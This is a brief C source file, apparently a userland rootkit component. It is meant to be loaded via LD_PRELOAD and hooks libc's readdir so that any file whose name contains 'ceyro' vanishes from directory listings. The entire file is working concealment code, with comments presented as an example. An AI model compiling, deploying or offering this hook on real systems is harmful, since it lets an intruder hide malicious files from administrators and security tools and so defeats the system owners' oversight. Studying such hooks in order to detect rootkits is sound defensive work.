#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>

// Function pointer to the original readdir from libc
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

// Our hooked version of readdir
struct dirent *readdir(DIR *dirp) {
    // Load the original readdir from libc if not done yet
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            return NULL;
        }
    }

    struct dirent *entry;

    // Loop until we find an entry that should NOT be hidden
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Define here: which filename or prefix should be hidden?
        // In this example, any file containing "ceyro" in its name is hidden.
        if (strstr(entry->d_name, "ceyro") != NULL) {
            // Skip this entry and fetch the next one
            continue;
        }

        // If the name doesn't contain "ceyro", pass it through normally
        return entry;
    }

    return NULL;
}
